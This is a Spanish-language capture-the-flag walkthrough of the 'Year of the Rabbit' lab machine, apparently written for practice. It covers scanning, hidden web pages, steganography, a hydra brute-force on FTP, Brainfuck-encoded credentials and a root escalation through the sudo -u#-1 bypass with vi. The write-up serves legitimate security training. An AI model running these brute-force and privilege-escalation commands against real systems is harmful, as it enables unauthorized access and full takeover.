# Year of the Rabbit

## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```
## Enum
### HTTP
#### Gobuster
```
/assets (Status: 301) <- Aqui dentro hay un rickrrolled.mp4 :v y un css
```
#### El CSS es una trampa
```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
```
#### sup3r_s3cr3t_fl4g
Si tenemos el js habilitado nos redirige a el video de Rick Roll, veamos que ocurre examinando la peticion en burpsuite
```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.211.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
Veamos que ese directorio hay una foto, la descargamos y miramos si se ha aplicado algún tipo de esteganografía a la misma, vemos que se ha añadido algo al final
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```
Seguido de esto hay una serie de strings que parece ser una wordlist.

## Exploit
```
hydra -l ftpuser -P pass.txt ftp://10.10.211.47
```
Y obtenemos la siguiente
```
[21][ftp] host: 10.10.211.47   login: ftpuser   password: 5iez1wGXKfPKQ
```
Una vez dentro tenemos el siguiente archivo:

```
drwxr-xr-x    2 0        0            4096 Jan 23  2020 .
drwxr-xr-x    2 0        0            4096 Jan 23  2020 ..
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
```
### Eli
Las creds para elli resultan se un string en Brainfuck
```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
Lo decodificamos y tenemos lo siguiente
```
User: eli

Password: DSpDiM1wAEwid
```
Cuando nos logeuamos tenemos el siguiente mensaje
```
Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there
```
Una busqueda con el comando find como la siguiente nos revelara un lugar escondido
```
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
```
Dentro hay un mensaje para gwendoline
```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
Con esto podemos logearnos como gwendoline

## Privesc
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
Este privesc es sencillo
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
> :!/bin/bash
```
Y ya tenemos shell como root
